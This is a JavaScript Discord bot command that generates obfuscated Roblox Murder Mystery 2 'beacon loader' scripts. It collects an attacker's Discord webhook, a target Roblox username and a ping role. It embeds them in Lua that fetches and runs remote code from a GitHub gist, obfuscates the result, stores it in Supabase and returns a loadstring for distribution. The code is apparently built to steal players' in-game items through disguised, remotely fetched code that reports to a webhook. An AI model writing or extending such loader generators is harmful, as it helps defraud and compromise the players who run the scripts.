import { saveScript } from '../services/supabase.js';
import { obfuscate } from '../services/methylone.js';

export const data = {
  name: 'generate',
  description: 'Generate an obfuscated MM2 beacon loader',
};

export async function execute(interaction) {
  // Step 1: Ask for webhook
  await interaction.reply({
    content: '🔐 Enter your Discord webhook URL:',
    ephemeral: true,
  });

  // Collect webhook
  const webhookFilter = (m) => m.author.id === interaction.user.id;
  const webhookMsg = await interaction.channel.awaitMessages({
    filter: webhookFilter,
    max: 1,
    time: 60000,
  });
  if (!webhookMsg.size) return interaction.editReply('❌ Timed out.');
  const webhook = webhookMsg.first().content.trim();

  // Step 2: Ask for target
  await interaction.editReply('🎯 Enter the target Roblox username:');
  const targetMsg = await interaction.channel.awaitMessages({
    filter: webhookFilter,
    max: 1,
    time: 60000,
  });
  if (!targetMsg.size) return interaction.editReply('❌ Timed out.');
  const target = targetMsg.first().content.trim();

  // Step 3: Ask for ping role (optional)
  await interaction.editReply('📌 Enter a ping role ID (or type `skip`):');
  const roleMsg = await interaction.channel.awaitMessages({
    filter: webhookFilter,
    max: 1,
    time: 60000,
  });
  let pingRole = '';
  if (roleMsg.size) {
    const roleInput = roleMsg.first().content.trim();
    if (roleInput.toLowerCase() !== 'skip') {
      pingRole = roleInput;
    }
  }

  // Step 4: Build base script
  const baseScript = `
_G.YOUR_WEBHOOK = '${webhook}'
_G.TARGET_USER = '${target}'
_G.PING_ROLE_ID = '${pingRole}'
loadstring(game:HttpGet('https://gist.githubusercontent.com/malik020859-ui/8cac02e02ce7d86743822761c71e741b/raw/df692088f170df8d44230d5133779638a0080932/MM2ANTIWARE', true))()
`;

  // Step 5: Obfuscate via Methylone
  await interaction.editReply('⏳ Obfuscating...');
  let obfuscated;
  try {
    obfuscated = await obfuscate(baseScript);
  } catch (err) {
    return interaction.editReply(`❌ Obfuscation failed: ${err.message}`);
  }

  // Step 6: Save to Supabase
  const id = await saveScript(obfuscated);

  // Step 7: Return loadstring
  const loadstring = `loadstring(game:HttpGet("https://your-app.railway.app/api/public/s/${id}"))()`;

  await interaction.editReply({
    content: `✅ **Loader generated!**\n\`\`\`lua\n${loadstring}\n\`\`\``,
    ephemeral: true,
  });
}